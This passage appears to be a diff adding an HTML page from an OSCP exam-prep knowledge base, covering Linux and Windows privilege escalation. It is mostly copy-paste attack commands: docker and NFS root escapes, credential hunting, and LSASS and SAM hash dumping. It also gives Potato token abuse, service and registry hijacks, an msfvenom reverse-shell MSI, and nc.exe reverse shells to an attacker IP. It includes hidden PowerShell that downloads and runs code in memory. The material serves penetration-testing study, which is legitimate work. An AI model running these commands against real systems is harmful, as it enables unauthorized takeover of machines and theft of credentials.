+<p><code>showmount -e $IP</code> shows an export with **<code>no_root_squash</code><strong>. On </strong>your own** machine (as root): mount that export, drop in a SUID-root shell binary (compile a tiny C program that does <code>setuid(0); execl(&quot;/bin/bash&quot;, ...)</code>); then on the target, run it as your low-priv user → root.</p>
+<h2 id="v6-[linux-docker-lxd]-container-group-escapes">[LINUX-DOCKER-LXD]  container / group escapes<a class="anchor" href="#v6-[linux-docker-lxd]-container-group-escapes">#</a></h2>
+<ul>
+<li>In the <strong>docker</strong> group: <code>docker run -v /:/mnt -it alpine chroot /mnt sh</code> → you&#x27;re root on the host&#x27;s disk.</li>
+<li>In the <strong>lxd/lxc</strong> group: import an alpine image and launch a privileged container with the host <code>/</code> mounted → root <code class="tag">[LOOK-UP]</code>.</li>
+<li>Inside a container (there&#x27;s a <code>/.dockerenv</code>): check <code>capsh --print</code>, mounted host paths, and <code>/var/run/docker.sock</code> (→ spawn a privileged container).</li>
+</ul>
+<h2 id="v6-[linux-creds]-hunting-creds-keys-also-[credentials-sources]">[LINUX-CREDS]  hunting creds &amp; keys (also <code class="tag">[CREDENTIALS-SOURCES]</code>)<a class="anchor" href="#v6-[linux-creds]-hunting-creds-keys-also-[credentials-sources]">#</a></h2>
+<p><code>~/.bash_history</code>, <code>~/.ssh/id_*</code> (reuse across users/hosts), config files with DB creds, <code>.env</code>, <code>/var/www/**</code>, backups, <code>find / -name &quot;*.kdbx&quot;</code> (KeePass), mounted shares, app dirs in <code>/opt</code> and <code>/srv</code>, <code>mysql -u root</code> with a blank password, a <code>.git</code> folder in the web root.</p>
+<h2 id="v6-[linux-kernel]-kernel-exploits-last-resort">[LINUX-KERNEL]  kernel exploits (LAST resort)<a class="anchor" href="#v6-[linux-kernel]-kernel-exploits-last-resort">#</a></h2>
+<p><strong>Detect:</strong> <code>uname -a</code>, <code>/etc/os-release</code>; <code>searchsploit linux kernel &lt;ver&gt;</code>; the tool <code>linux-exploit-suggester2</code>.</p>
+<p><strong>Warning:</strong> kernel exploits can <strong>crash the box</strong> (forcing a revert) → only try after you&#x27;ve exhausted everything else. Match the exact kernel + distro + architecture.</p>
+<p><strong>Common ones:</strong> DirtyCOW (old), <strong>DirtyPipe (kernels 5.8–5.16.11)</strong>, PwnKit (pkexec — not the kernel, but nearly universal), OverlayFS variants, Sudo Baron Samedit.</p>
+<h2 id="v6-[linux-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">[LINUX-LOCAL-ENUM]  &quot;check X → run this&quot; table (copy-paste after you get a shell)<a class="anchor" href="#v6-[linux-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">#</a></h2>
+<pre><code>Who am I          id ; whoami ; groups
+OS / kernel       uname -a ; cat /etc/os-release        (→ linux-exploit-suggester)
+Users             cat /etc/passwd ; ls -la /home        (accounts with a login shell = real users)
+sudo rights       sudo -l                               (the #1 quick win)
+SUID / SGID       find / -perm -4000 -type f 2&gt;/dev/null ; find / -perm -2000 -type f 2&gt;/dev/null
+Capabilities      getcap -r / 2&gt;/dev/null
+Cron / timers     crontab -l ; cat /etc/crontab ; ls -la /etc/cron.* ; systemctl list-timers ; pspy
+Running procs     ps aux --forest                       (an unusual process → look in its folder)
+Listening ports   ss -tlnp   (or netstat -tulpn)        (127.0.0.1-only = a pivot lead)
+Writable stuff    find / -writable -not -path &quot;/proc/*&quot; 2&gt;/dev/null | grep -vE &#x27;^/(sys|run|tmp|dev)&#x27;
+Network           ip a ; ip route ; arp -a
+Mounts/creds      mount ; cat /etc/fstab
+Loot              ls -la ~/.ssh ; cat ~/.bash_history ; env ; find / -name &quot;*.kdbx&quot; 2&gt;/dev/null</code></pre>
+<p><strong>🚩 flag / creds hunt:</strong></p>
+<pre><code>find / -iname &#x27;*flag*&#x27; 2&gt;/dev/null
+grep -rniE &#x27;flag\{|OS\{|password|secret&#x27; /home /var/www /opt /etc 2&gt;/dev/null</code></pre>
+<h2 id="v6-[linux-privesc-manual]-full-manual-checklist-when-linpeas-is-unavailable-or-misses-it">[LINUX-PRIVESC-MANUAL]  full manual checklist (when linpeas is unavailable or misses it)<a class="anchor" href="#v6-[linux-privesc-manual]-full-manual-checklist-when-linpeas-is-unavailable-or-misses-it">#</a></h2>
+<pre><code># 🚩 hunt for a flag / creds anywhere:
+find / -iname &#x27;*flag*&#x27; 2&gt;/dev/null ; grep -rniE &#x27;flag\{|OS\{|password&#x27; /home /var/www /opt 2&gt;/dev/null
+id; sudo -l; uname -a; cat /etc/os-release       # who am I + sudo rights + kernel/OS (the first 4 checks)
+find / -perm -4000 -type f 2&gt;/dev/null; find / -perm -2000 -type f 2&gt;/dev/null   # SUID / SGID → GTFOBins
+getcap -r / 2&gt;/dev/null                           # capabilities (cap_setuid on python/perl = root)
+cat /etc/crontab; ls -la /etc/cron*; systemctl list-timers   # scheduled jobs (writable = root)
+find / -writable -not -path &quot;/proc/*&quot; 2&gt;/dev/null | grep -vE &#x27;^/(sys|run|tmp|dev)&#x27;   # writable files root touches
+cat /etc/passwd; ls -la /home/*; find / -name &quot;*.kdbx&quot; -o -name &quot;id_rsa&quot; 2&gt;/dev/null   # users + SSH/KeePass loot
+history; cat ~/.bash_history 2&gt;/dev/null; env     # command history + env vars (passwords leak here)
+ss -tlnp; ip a; arp -a                            # internal services / pivot leads
+ps aux --forest                                   # root processes → target them (pspy for timing)
+mount; cat /etc/fstab                             # nfs/no_root_squash, creds in fstab</code></pre>
+<h2 id="v6-[common-rabbit-holes-linux-privesc]">[COMMON-RABBIT-HOLES linux-privesc]<a class="anchor" href="#v6-[common-rabbit-holes-linux-privesc]">#</a></h2>
+<ul>
+<li>Trying kernel exploits first (they should be *last*). Chasing every SUID (most are standard/harmless). Cracking a hash you don&#x27;t actually need. Drowning in linpeas noise. A &quot;writable&quot; file that&#x27;s really in <code>/proc</code> or <code>/tmp</code> and useless.</li>
+</ul>
+<hr>
+<h1 id="v6-[windows-privesc]-getting-system-on-windows">[WINDOWS-PRIVESC]  getting SYSTEM on Windows<a class="anchor" href="#v6-[windows-privesc]-getting-system-on-windows">#</a></h1>
+<h2 id="v6-[windows-privesc-quick]-first-60-seconds-on-any-windows-shell-one-screen">[WINDOWS-PRIVESC-QUICK]  first 60 seconds on any Windows shell  (one screen)<a class="anchor" href="#v6-[windows-privesc-quick]-first-60-seconds-on-any-windows-shell-one-screen">#</a></h2>
+<pre><code>whoami /all                              :: [MUST-MEMORIZE] your user, groups, AND privileges — all at once
+whoami /priv                             :: the privileges list — SeImpersonate? SeBackup? (these are gold)
+systeminfo                               :: OS version/build + installed patches (kernel-exploit hints)
+net user %username% &amp; net localgroup administrators
+cmdkey /list &amp; dir C:\ &amp; net user
+:: automate:
+.\winPEASx64.exe &gt; wp.txt                :: (or PowerUp / Seatbelt)</code></pre>
+<p><strong>Check in order:</strong> <code>whoami /priv</code> (SeImpersonate/SeBackup are near-instant wins) → service/registry permissions → unquoted service paths → AlwaysInstallElevated → saved creds → autologon → <strong>kernel (last)</strong>.</p>
+<h2 id="v6-[winpeas-workflow]">[WINPEAS-WORKFLOW]<a class="anchor" href="#v6-[winpeas-workflow]">#</a></h2>
+<ol>
+<li>Transfer winPEAS (<code>winPEASx64.exe</code>; use the <code>.bat</code> or PowerShell variant if AV blocks the exe). Save the output.</li>
+<li>Read the RED highlights: privileges, service misconfigs, unquoted paths, AlwaysInstallElevated, stored creds, autologon.</li>
+<li>Confirm each by hand (winPEAS over-reports on service permissions). Run <strong>PowerUp</strong> (<code>Invoke-AllChecks</code>) and/or <strong>Seatbelt</strong> for a second opinion.</li>
+</ol>
+<h2 id="v6-[windows-tokens]-abusing-privileges-the-fastest-wins-[tech-tokens]">[WINDOWS-TOKENS]  abusing privileges (the fastest wins)  → <code class="tag">[TECH-TOKENS]</code><a class="anchor" href="#v6-[windows-tokens]-abusing-privileges-the-fastest-wins-[tech-tokens]">#</a></h2>
+<p><strong>What it is:</strong> Windows accounts hold &quot;privileges.&quot; A few of them can be turned directly into SYSTEM. **Always check <code>whoami /priv</code> first** — this is the most common Windows privesc on OSCP.</p>
+<p><strong>Detect:</strong> <code>whoami /priv</code>.</p>
+<p><strong>The valuable ones and how to use them:</strong></p>
+<ul>
+<li><strong>SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege</strong> (common on service accounts, IIS, MSSQL) → a <strong>&quot;Potato&quot;</strong> attack → SYSTEM:</li>
+<ul>
+<li><code>PrintSpoofer64.exe -i -c cmd</code> (or <code>-c &quot;nc.exe &lt;IP&gt; 443 -e cmd&quot;</code>).</li>
+<li><code>GodPotato -cmd &quot;cmd /c whoami&quot;</code> (modern; works on Server 2012–2022).</li>
+<li><code>JuicyPotatoNG</code> / <code>RoguePotato</code> (older variants) <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<li><strong>SeBackupPrivilege / SeRestorePrivilege</strong> → read any file: back up the SAM+SYSTEM registry hives (<code>reg save</code>) → <code>secretsdump</code> → the admin&#x27;s hash; or copy <code>NTDS.dit</code> on a Domain Controller.</li>
+<li><strong>SeTakeOwnershipPrivilege</strong> → take ownership of a sensitive file/binary → replace it.</li>
+<li><strong>SeDebugPrivilege</strong> → dump LSASS memory (mimikatz/procdump) → creds.</li>
+<li><strong>SeLoadDriverPrivilege</strong> → load a vulnerable driver <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<p><strong>Verify:</strong> <code>whoami</code> = <code>nt authority\system</code> (or a machine account like <code>secura\dc01$</code> on a DC — same power, see gotchas).</p>
+<h3 id="v6-[potato-gotchas]-when-printspoofergodpotato-works-but-you-get-nothing-battle-tested">[POTATO-GOTCHAS]  when PrintSpoofer/GodPotato &quot;works&quot; but you get nothing (battle-tested)<a class="anchor" href="#v6-[potato-gotchas]-when-printspoofergodpotato-works-but-you-get-nothing-battle-tested">#</a></h3>
+<p>Real problems you WILL hit, and the exact fixes:</p>
+<ul>
+<li>**<code>-i</code> (interactive) fails:** <code>CreateProcessAsUser() failed... retrying with CreateProcessWithTokenW()</code> → <code>[!] CreateProcessWithTokenW() isn&#x27;t compatible with option -i</code>. The fallback token method can&#x27;t spawn an interactive prompt. <strong>FIX:</strong> drop <code>-i</code>, use <code>-c &quot;&lt;command&gt;&quot;</code> instead (it still runs as SYSTEM).</li>
+<li>**<code>-c &quot;whoami&quot;</code> runs but prints NOTHING:** with <code>CreateProcessWithTokenW</code>, the child&#x27;s output doesn&#x27;t come back to your shell. It *did* run — you just can&#x27;t see it. <strong>FIX — two options:</strong></li>
+<ol>
+<li><strong>Reverse shell (best — gives you an interactive SYSTEM shell):</strong> <code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KaliIP&gt; LPORT=443 -f exe -o sh.exe</code>, transfer it, then <code>.\ps.exe -c &quot;C:\path\sh.exe&quot;</code> → catch it on <code>nc -lvnp 443</code>. (If Defender eats the msfvenom exe on a DC, use the file trick below.)</li>
+<li><strong>Redirect the output to a file you can read:</strong> <code>.\ps.exe -c &quot;cmd /c &lt;command&gt; &gt; C:\Users\&lt;you&gt;\Desktop\o.txt &amp; icacls C:\Users\&lt;you&gt;\Desktop\o.txt /grant &lt;you&gt;:F&quot;</code> then <code>type</code> it. **Write to your OWN profile, not <code>C:\Users\Public</code>** — Public often has inherited *deny* rules; the <code>icacls /grant</code> makes the SYSTEM-created file readable by you.</li>
+</ol>
+<li>**You become <code>MACHINE$</code> instead of <code>nt authority\system</code>:** e.g. <code>secura\dc01$</code>. On the DC that computer account is SYSTEM-equivalent locally — full access, don&#x27;t panic.</li>
+<li>**<code>type C:\Users\Administrator\Desktop\proof.txt</code> → &quot;cannot find the path&quot;:<strong> the admin profile is often renamed </strong><code>Administrator.DC01</code>** (or <code>Administrator.&lt;DOMAIN&gt;</code>) on a DC. <strong>FIX:</strong> <code>dir C:\Users</code> to see the real names, or hunt: <code>where /r C:\ proof.txt</code> → then <code>type &lt;full path&gt;</code>.</li>
+<li><strong>certutil download fails &quot;CANNOT_CONNECT&quot; (0x80072efd):</strong> the URL must point at **YOUR Kali <code>tun0</code> IP** with <code>python3 -m http.server 80</code> running — never a victim&#x27;s IP. Get your IP with <code>ip addr show tun0</code>.</li>
+</ul>
+<h2 id="v6-[windows-services]-service-misconfigurations">[WINDOWS-SERVICES]  service misconfigurations<a class="anchor" href="#v6-[windows-services]-service-misconfigurations">#</a></h2>
+<p><strong>What it is:</strong> Windows &quot;services&quot; are background programs, usually running with high privileges. If you can swap the program a service runs, or change its config, your code runs with those privileges.</p>
+<p><strong>Detect:</strong> PowerUp <code>Invoke-AllChecks</code>; <code>accesschk.exe -uwcqv &quot;user&quot; *</code>; winPEAS.</p>
+<ul>
+<li><strong>Unquoted service path:</strong> <code>wmic service get name,pathname,startmode | findstr /i &quot;auto&quot; | findstr /i /v &quot;c:\windows\\&quot;</code> → a path with spaces, no quotes, and a writable folder along the way. <strong>Exploit:</strong> place <code>C:\Program.exe</code> (in the writable segment) → restart the service → it runs as the service account.</li>
+<li><strong>Writable service binary:</strong> <code>sc qc &lt;svc&gt;</code>; if you can overwrite the EXE → replace it with your payload → restart. <code>sc config &lt;svc&gt; binPath= &quot;C:\temp\rev.exe&quot;</code> (if you can change config) then <code>sc start &lt;svc&gt;</code>.</li>
+<li><strong>Weak service config permissions:</strong> <code>sc config &lt;svc&gt; binPath= &quot;cmd /c net localgroup administrators &lt;you&gt; /add&quot;</code> → <code>sc stop/start</code>.</li>
+<li><strong>DLL hijacking:</strong> a service loads a missing DLL from a writable folder → drop a malicious DLL <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<p><strong>Verify:</strong> a new admin / SYSTEM shell after the restart. <strong>Troubleshoot:</strong> you need restart rights (<code>sc start</code> denied → does it auto-restart, or can you <code>shutdown /r</code>?); <code>binPath=</code> needs a space after the <code>=</code>.</p>
+<h2 id="v6-[windows-registry]-registry-based">[WINDOWS-REGISTRY]  registry-based<a class="anchor" href="#v6-[windows-registry]-registry-based">#</a></h2>
+<ul>
+<li><strong>AlwaysInstallElevated:</strong> if both <code>HKLM</code> and <code>HKCU</code> have <code>...\Installer\AlwaysInstallElevated = 1</code>, any <code>.msi</code> you install runs as SYSTEM.</li>
+</ul>
+<p>  <code></code>`cmd</p>
+<p>  reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+<p>  reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</p>
+<p>  msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f msi -o x.msi</p>
+<p>  msiexec /quiet /qn /i x.msi</p>
+<p>  <code></code>`</p>
+<ul>
+<li><strong>Writable Autorun/Run keys</strong> → drop a payload for the next admin login.</li>
+<li><strong>Autologon creds:</strong> <code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code> → <code>DefaultUserName</code> / <code>DefaultPassword</code> in cleartext.</li>
+<li><strong>Weak registry service perms</strong> (writable <code>ImagePath</code>) → point it at your payload.</li>
+</ul>
+<h2 id="v6-[windows-creds]-credential-hunting-[credentials-sources]">[WINDOWS-CREDS]  credential hunting  → <code class="tag">[CREDENTIALS-SOURCES]</code><a class="anchor" href="#v6-[windows-creds]-credential-hunting-[credentials-sources]">#</a></h2>
+<pre><code>cmdkey /list                          :: saved creds → runas /savecred /user:X cmd
+reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;   :: autologon password
+dir /s /b C:\*unattend.xml C:\*sysprep.inf C:\*.kdbx C:\*.config 2&gt;nul
+findstr /si password *.xml *.ini *.txt *.config          :: search a folder of interest for &quot;password&quot;
+type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+:: with admin — dump hashes:
+reg save HKLM\SAM sam.hive &amp; reg save HKLM\SYSTEM sys.hive
+:: then on Kali:  secretsdump.py -sam sam.hive -system sys.hive LOCAL</code></pre>
+<ul>
+<li><strong>runas with a saved cred:</strong> <code>runas /savecred /user:admin &quot;cmd /c &lt;payload&gt;&quot;</code>.</li>
+<li>Also: <strong>DPAPI</strong>, <strong>LSASS</strong> (mimikatz <code>sekurlsa::logonpasswords</code>, or <code>procdump -ma lsass.exe</code> then dump offline), Wi-Fi/vault creds.</li>
+</ul>
+<h2 id="v6-[windows-startup]-startup-scheduled-tasks">[WINDOWS-STARTUP]  startup / scheduled tasks<a class="anchor" href="#v6-[windows-startup]-startup-scheduled-tasks">#</a></h2>
+<ul>
+<li>A writable <strong>Startup folder</strong>, or a <strong>scheduled task</strong> that runs as admin with a binary you can overwrite → replace/drop your payload.</li>
+<li><code>schtasks /query /fo LIST /v | findstr /i &quot;Task To Run\|Run As User&quot;</code> → find admin tasks with weak binary permissions.</li>
+</ul>
+<h2 id="v6-[windows-installed]-installed-software-find-a-vulnerable-app">[WINDOWS-INSTALLED]  installed software (find a vulnerable app)<a class="anchor" href="#v6-[windows-installed]-installed-software-find-a-vulnerable-app">#</a></h2>
+<pre><code>reg query &quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot; /s
+reg query &quot;HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall&quot; /s   :: 32-bit apps — don&#x27;t miss this!</code></pre>
+<p>Also <code>dir &quot;C:\Program Files&quot;</code> and <code>&quot;C:\Program Files (x86)&quot;</code>. A vulnerable version → <code>searchsploit &lt;product&gt; &lt;version&gt;</code> → local privesc (<code class="tag">[EXPLOIT-RESEARCH]</code>).</p>
+<h2 id="v6-[windows-processes]-running-processes-find-the-non-standard-one">[WINDOWS-PROCESSES]  running processes — find the non-standard one<a class="anchor" href="#v6-[windows-processes]-running-processes-find-the-non-standard-one">#</a></h2>
+<pre><code>Get-Process | Select Name,Id,Path | Sort Name
+Get-WmiObject Win32_Process | Select Name,ProcessId,ExecutablePath,CommandLine   # includes the command line
+# surface anything NOT running from C:\Windows (i.e. custom software):
+Get-Process | ? { $_.Path -and $_.Path -notlike &quot;C:\Windows\*&quot; } | Select Name,Path</code></pre>
+<p><strong>Why:</strong> a process running from <code>C:\Users\</code>, <code>C:\Temp</code>, <code>C:\Tools</code>, or an odd folder = <strong>custom software</strong> → check whether you can overwrite its EXE (→ <code class="tag">[WINDOWS-SERVICES]</code>) and loot its folder for creds/configs/flags (<code>Get-ChildItem &lt;dir&gt; -Recurse -Force</code>). This is the Windows version of Linux&#x27;s <code>ps aux --forest</code>.</p>
+<h2 id="v6-[windows-kernel]-kernelos-exploits-last-resort">[WINDOWS-KERNEL]  kernel/OS exploits (LAST resort)<a class="anchor" href="#v6-[windows-kernel]-kernelos-exploits-last-resort">#</a></h2>
+<p><strong>Detect:</strong> <code>systeminfo</code> → feed it to <strong>Windows Exploit Suggester</strong> (<code>wesng</code>); note missing hotfixes + the build number.</p>
+<p><strong>Common (must match the build):</strong> older systems → MS16-032, MS15-051, MS16-135. Prefer token/service methods first — kernel exploits risk crashing the box.</p>
+<h2 id="v6-[powershell]-the-windows-powershell-commands-you-actually-type">[POWERSHELL]  ⚡ the Windows PowerShell commands you actually type<a class="anchor" href="#v6-[powershell]-the-windows-powershell-commands-you-actually-type">#</a></h2>
+<pre><code># launch flags (prepend to any payload):
+powershell -nop -w hidden -ep bypass -c &quot;&lt;command&gt;&quot;    # no-profile, hidden window, bypass execution policy
+powershell -enc &lt;base64-UTF16LE&gt;                        # build with: echo -n &#x27;&lt;ps&gt;&#x27;|iconv -t UTF-16LE|base64 -w0
+
+# download (target pulls from your Kali&#x27;s python3 -m http.server) → [FILETRANSFER-QUICK]:
+IWR http://&lt;IP&gt;/f -OutFile C:\Windows\Temp\f            # Invoke-WebRequest
+(New-Object Net.WebClient).DownloadFile(&#x27;http://&lt;IP&gt;/f&#x27;,&#x27;C:\Windows\Temp\f&#x27;)   # works on OLD PowerShell too
+IEX(New-Object Net.WebClient).DownloadString(&#x27;http://&lt;IP&gt;/x.ps1&#x27;)   # download + run IN MEMORY (never touches disk)
+[Net.ServicePointManager]::SecurityProtocol=&#x27;Tls12&#x27;     # if you get TLS/download errors
+
+# enumerate:
+Get-LocalUser ; Get-LocalGroupMember Administrators
+Get-Service | ? {$_.Status -eq &#x27;Running&#x27;} | Select Name,DisplayName
+Get-ScheduledTask | ? {$_.State -eq &#x27;Ready&#x27;}
+Get-ChildItem C:\ -Recurse -Force -EA SilentlyContinue -Include *.kdbx,*.config,*flag*
+Select-String -Path C:\Users\*\* -Pattern &#x27;password|OS\{&#x27; -List -EA SilentlyContinue
+
+# run as another user / remote (→ [AD-DOUBLEHOP]):
+$p=ConvertTo-SecureString &#x27;PASS&#x27; -AsPlainText -Force
+$c=New-Object System.Management.Automation.PSCredential(&#x27;DOMAIN\user&#x27;,$p)
+Invoke-Command -ComputerName host2 -Credential $c -ScriptBlock { whoami }</code></pre>
+<blockquote>Reverse shells + <code>Invoke-ConPtyShell</code> (a real interactive TTY) are in <code class="tag">[SHELL-WINDOWS]</code> / <code class="tag">[SHELL-STABILIZE]</code>.</blockquote>
+<h2 id="v6-[win-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">[WIN-LOCAL-ENUM]  &quot;check X → run this&quot; table (copy-paste after you get a shell)<a class="anchor" href="#v6-[win-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">#</a></h2>
+<pre><code>OS / patches      systeminfo                                   (→ wesng for kernel exploits)
+Who am I          whoami /all                                  (user, groups, PRIVILEGES together)
+Users / groups    net user | Get-LocalUser ; net localgroup administrators
+Privileges        whoami /priv                                 (SeImpersonate? SeBackup?)
+Installed apps    reg query &quot;HKLM\...\Uninstall&quot; /s ; +WOW6432Node for 32-bit   [WINDOWS-INSTALLED]
+Running processes Get-Process | Select Name,Id,Path            [WINDOWS-PROCESSES]
+Services          sc query | Get-Service | wmic service get name,pathname,startmode
+Scheduled tasks   schtasks /query /fo LIST /v
+Network / ports   netstat -ano | ipconfig /all | route print | arp -a
+Stored creds      cmdkey /list | reg query &quot;HKLM\...\Winlogon&quot;      [WINDOWS-CREDS]
+PowerShell hist   type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code></pre>
+<p><strong>🚩 Hunt for a flag / creds anywhere:</strong></p>
+<pre><code>dir /s /b C:\*flag*.txt 2&gt;nul
+findstr /s /i &quot;OS{ flag password&quot; C:\Users\*.txt 2&gt;nul</code></pre>
+<pre><code>Get-ChildItem C:\ -Recurse -Include *flag*,*.txt -EA SilentlyContinue | Select FullName
+Select-String -Path C:\Users\*\* -Pattern &#x27;OS\{|flag\{&#x27; -List -EA SilentlyContinue</code></pre>
+<h2 id="v6-[windows-privesc-manual]-checklist">[WINDOWS-PRIVESC-MANUAL]  checklist<a class="anchor" href="#v6-[windows-privesc-manual]-checklist">#</a></h2>
+<pre><code>whoami /all &amp; whoami /priv &amp; systeminfo &amp; hostname       :: identity + PRIVILEGES + OS build
+net user &amp; net localgroup administrators &amp; net accounts  :: local users, admins, password policy
+cmdkey /list &amp; reg query &quot;HKLM\...\Winlogon&quot;             :: saved creds + autologon password
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated   :: both =1 → .msi as SYSTEM
+wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v &quot;c:\windows&quot;  :: UNQUOTED service paths
+schtasks /query /fo LIST /v | findstr /i &quot;Task To Run\|Run As&quot;   :: admin scheduled tasks
+dir /s /b C:\*.config C:\*unattend* C:\*.kdbx 2&gt;nul       :: config/unattend/KeePass → creds
+netstat -ano &amp; ipconfig /all &amp; route print &amp; arp -a       :: internal services / other subnets (pivot leads)</code></pre>
+<h2 id="v6-[common-rabbit-holes-windows-privesc]">[COMMON-RABBIT-HOLES windows-privesc]<a class="anchor" href="#v6-[common-rabbit-holes-windows-privesc]">#</a></h2>
+<ul>
+<li>Jumping to kernel exploits before checking <code>whoami /priv</code>. Chasing a service you can&#x27;t restart. Cracking a hash when Pass-the-Hash already works. AV eating your winPEAS.exe (use the PS/bat variant or go manual). An unquoted path where no folder along the way is writable (a false positive).</li>
+</ul>
+<hr>
+<p>*End Volume 4. Next: Volume 5 — Active Directory (attacking a Windows domain) and pivoting between networks.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
